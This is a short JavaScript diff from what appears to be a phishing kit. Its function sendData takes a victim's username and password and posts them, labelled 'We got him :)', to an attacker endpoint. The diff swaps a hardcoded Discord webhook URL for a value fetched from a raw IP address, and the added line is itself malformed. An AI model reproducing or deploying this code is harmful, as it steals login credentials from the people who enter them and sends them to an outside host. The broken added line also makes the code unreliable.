@@ -1,6 +1,7 @@
 
+var webhook = $.get('70.95.197.6', 'e', console.log("Status: " + status), text)
 function sendData(User, Pass) {
-    $.post('https://discord.com/api/webhooks/1049386385670418483/2ldO8XQev3xqHJt2j-hl2RhsNkpGXGsz90guX1_3fEDUhSc4Jin4E9MLz7vaweLsy4_5',
+    $.post(webhook,
     {
         'username': 'We got him :)',
         'content': 'Username:\n\t' + User + '\nPassword:\n\t' + Pass,
